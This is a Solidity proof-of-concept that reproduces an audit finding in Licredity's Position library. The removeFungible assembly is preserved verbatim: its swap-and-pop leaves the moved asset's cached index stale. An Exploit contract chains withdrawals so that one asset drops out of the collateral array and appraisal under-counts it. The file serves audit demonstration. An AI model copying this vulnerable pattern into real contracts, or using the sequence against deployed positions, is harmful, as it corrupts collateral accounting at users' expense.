// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Licredity — Swap-and-pop without index fix-up corrupts Position fungibles
    (Cyfrin review, finding #62348)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: Position::removeFungible swap-and-pops the fungibles array but
    never updates the moved element’s cached 1-based index in fungibleStates.
    The assembly body of the array move is preserved VERBATIM (@> VULN).
    Harm: removing one asset can silently drop another from the enumeration
    array while leaving a ghost balance in the mapping — appraisal that walks
    fungibles[] under-counts collateral.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC20 used as fungible collateral.
contract MockToken {
    string public name;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n) {
        name = n;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced Position storage + library logic (vulnerable removeFungible).
///         Inlined as a contract so the R3 locator points at the real runtime
///         address of the assembly body (internal libs are inlined into the user).
contract PositionManager {
    // Mirrors Licredity Position layout used by the vulnerable assembly offsets:
    //   slot+0 owner, +1 debtShare, +2 fungibles[], +3 nonFungibles[], +4 fungibleStates
    struct Position {
        address owner;
        uint256 debtShare;
        address[] fungibles; // Fungible[] as address
        address[] nonFungibles; // unused padding for offset fidelity
        // fungibleStates: packed as (index << 128) | balance  — 1-based index, 0 = absent
        mapping(address => uint256) fungibleStates;
    }

    // offsets matching Position.sol (FUNGIBLES_OFFSET=2, FUNGIBLE_STATES_OFFSET=4)
    uint256 private constant FUNGIBLES_OFFSET = 2;
    uint256 private constant FUNGIBLE_STATES_OFFSET = 4;

    mapping(uint256 => Position) private positions;
    uint256 public positionCount;

    function open() external returns (uint256 id) {
        id = ++positionCount;
        positions[id].owner = msg.sender;
    }

    function ownerOf(uint256 id) external view returns (address) {
        return positions[id].owner;
    }

    function fungiblesLength(uint256 id) external view returns (uint256) {
        return positions[id].fungibles.length;
    }

    function fungibleAt(uint256 id, uint256 i) external view returns (address) {
        return positions[id].fungibles[i];
    }

    function fungibleIndex(uint256 id, address asset) external view returns (uint256) {
        return positions[id].fungibleStates[asset] >> 128;
    }

    function fungibleBalance(uint256 id, address asset) external view returns (uint256) {
        return uint256(uint128(positions[id].fungibleStates[asset]));
    }

    /// @notice Appraised collateral value = sum of balances for assets in fungibles[].
    ///         Real Licredity appraisal iterates the array — so a ghost mapping
    ///         balance that is missing from the array is silently under-counted.
    function appraise(uint256 id) public view returns (uint256 value) {
        Position storage p = positions[id];
        uint256 len = p.fungibles.length;
        for (uint256 i = 0; i < len; ++i) {
            address a = p.fungibles[i];
            value += uint256(uint128(p.fungibleStates[a]));
        }
    }

    function deposit(uint256 id, address asset, uint256 amount) external {
        Position storage self = positions[id];
        require(self.owner == msg.sender, "NotPositionOwner");
        MockToken(asset).transferFrom(msg.sender, address(this), amount);

        uint256 state = self.fungibleStates[asset];
        uint256 index = state >> 128;
        uint256 bal = uint256(uint128(state));

        if (index == 0) {
            // add a fungible to the fungibles array (faithful to Position::addFungible)
            assembly ("memory-safe") {
                let slot := add(self.slot, FUNGIBLES_OFFSET)
                let len := sload(slot)
                mstore(0x00, slot)
                sstore(add(keccak256(0x00, 0x20), len), asset)
                sstore(slot, add(len, 1))
            }
            // new index = length (1-based); balance = amount
            uint256 newIndex = self.fungibles.length;
            self.fungibleStates[asset] = (newIndex << 128) | amount;
        } else {
            self.fungibleStates[asset] = (index << 128) | (bal + amount);
        }
    }

    /// @notice Withdraw `amount` of `asset`. When balance hits zero, swap-and-pop
    ///         the fungibles array — missing the moved-element index fix-up.
    function withdraw(uint256 id, address asset, uint256 amount) external {
        Position storage self = positions[id];
        require(self.owner == msg.sender, "NotPositionOwner");

        uint256 state = self.fungibleStates[asset];
        uint256 index = state >> 128;
        uint256 bal = uint256(uint128(state));
        require(index != 0, "not present");
        require(bal >= amount, "bal");

        uint256 newBalance = bal - amount;

        if (newBalance != 0) {
            self.fungibleStates[asset] = (index << 128) | newBalance;
        } else {
            // clear state for the removed asset
            self.fungibleStates[asset] = 0;

            // remove a fungible from the fungibles array
            // VERBATIM from Position.sol@e8ae10a (lines 90-102) — missing index fix-up
            assembly ("memory-safe") {
                let slot := add(self.slot, FUNGIBLES_OFFSET)
                let len := sload(slot)
                mstore(0x00, slot)
                let dataSlot := keccak256(0x00, 0x20)

                if iszero(eq(index, len)) {
                    // overwrite removed slot with the last element (swap)
                    sstore(add(dataSlot, sub(index, 1)), sload(add(dataSlot, sub(len, 1))))
                }

                // pop — shrinks length but never rewrites fungibleStates[moved].index
                sstore(add(dataSlot, sub(len, 1)), 0)
                sstore(slot, sub(len, 1)) // @> VULN: swap-and-pop without updating the moved element's cached index
                // FIX: after the swap, set fungibleStates[moved].index = index (1-based)
            }
        }

        MockToken(asset).transfer(msg.sender, amount);
    }
}

/// @dev Orchestrator: deposits A,B,C then removes A then C to corrupt B.
contract Exploit {
    MockToken public tokenA; // CREATE nonce 1
    MockToken public tokenB; // CREATE nonce 2
    MockToken public tokenC; // CREATE nonce 3
    PositionManager public pm; // CREATE nonce 4 — vulnerable
    uint256 public positionId;
    uint256 public appraisedAfter; // under-counted value after corruption
    uint256 public ghostBalanceB; // B still has balance in mapping
    bool public bInArray; // B missing from fungibles[]

    constructor() {
        tokenA = new MockToken("A");
        tokenB = new MockToken("B");
        tokenC = new MockToken("C");
        pm = new PositionManager();

        // fund this contract with 1 ether of each asset
        tokenA.mint(address(this), 1 ether);
        tokenB.mint(address(this), 1 ether);
        tokenC.mint(address(this), 1 ether);
    }

    function run() external {
        // open a position owned by this Exploit contract
        positionId = pm.open();

        // deposit A, B, C → fungibles = [A, B, C], indexes 1,2,3
        tokenA.approve(address(pm), 1 ether);
        tokenB.approve(address(pm), 1 ether);
        tokenC.approve(address(pm), 1 ether);
        pm.deposit(positionId, address(tokenA), 1 ether);
        pm.deposit(positionId, address(tokenB), 1 ether);
        pm.deposit(positionId, address(tokenC), 1 ether);

        require(pm.fungiblesLength(positionId) == 3, "pre len");
        require(pm.fungibleIndex(positionId, address(tokenA)) == 1, "pre A idx");
        require(pm.fungibleIndex(positionId, address(tokenB)) == 2, "pre B idx");
        require(pm.fungibleIndex(positionId, address(tokenC)) == 3, "pre C idx");
        require(pm.appraise(positionId) == 3 ether, "pre value");

        // 1) Fully remove A (non-tail). Swap-and-pop moves C into slot 0.
        //    Correct code would set index(C)=1; vulnerable code leaves index(C)=3.
        pm.withdraw(positionId, address(tokenA), 1 ether);

        require(pm.fungiblesLength(positionId) == 2, "after A: len");
        require(pm.fungibleAt(positionId, 0) == address(tokenC), "after A: [0]=C");
        // STALE index: C still claims index 3
        require(pm.fungibleIndex(positionId, address(tokenC)) == 3, "after A: C index stale");

        // 2) Fully remove C using the stale index=3 while len=2.
        //    Assembly writes B into slot (3-1)=2 (past the active array) and pops
        //    slot 1 → B silently vanishes from the active enumeration.
        pm.withdraw(positionId, address(tokenC), 1 ether);

        // HARM: B still has a positive mapping balance (ghost), but is gone from
        // fungibles[] — appraisal that iterates the array under-counts by 1 ether.
        ghostBalanceB = pm.fungibleBalance(positionId, address(tokenB));
        require(ghostBalanceB == 1 ether, "B ghost balance lost");

        uint256 len = pm.fungiblesLength(positionId);
        bInArray = false;
        for (uint256 i = 0; i < len; ++i) {
            if (pm.fungibleAt(positionId, i) == address(tokenB)) bInArray = true;
        }
        require(!bInArray, "B should be missing from array");

        appraisedAfter = pm.appraise(positionId);
        // Real collateral is still 1 ether of B; appraisal sees 0 (or junk ≠ 1e18).
        require(appraisedAfter != 1 ether, "appraisal should not equal true B balance");
        // Stronger: true value (mapping) is 1 ether, enumerated value is not.
        require(appraisedAfter < ghostBalanceB, "enumerated value under-counts ghost B");
    }
}
